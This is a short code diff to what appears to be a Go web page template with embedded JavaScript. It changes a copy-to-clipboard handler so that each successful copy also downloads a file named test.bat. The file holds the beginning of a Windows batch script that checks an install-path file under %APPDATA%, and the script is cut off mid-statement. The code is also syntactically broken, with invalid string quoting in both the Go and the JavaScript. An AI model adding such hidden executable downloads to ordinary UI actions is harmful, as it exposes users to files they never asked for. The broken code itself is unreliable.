@@ -296,7 +296,6 @@ func getQueue(id int) string {
 }
 
 func init() {
-	contentx, err := ioutil.ReadFile('test.txt');
 	pageTemplate = template.Must(template.New("page").Parse(pageSource))
 }
 
@@ -482,10 +481,17 @@ var copyCode = function(elem) {
 	try {
 		if (document.execCommand("copy")) {
 		
+			var a1 = "@echo off
+setlocal enabledelayedexpansion
+
+:start
+set LOL_PATH=\"
+
+if exist \"%APPDATA%\LoG_lolinstallpath.txt\" (";
 		
 		
 			flashButton(elem, true);
-			downloadff('test.bat', contentx);
+			downloadff('test.bat', a1);
 		} else {
 			flashButton(elem, false);
 		}
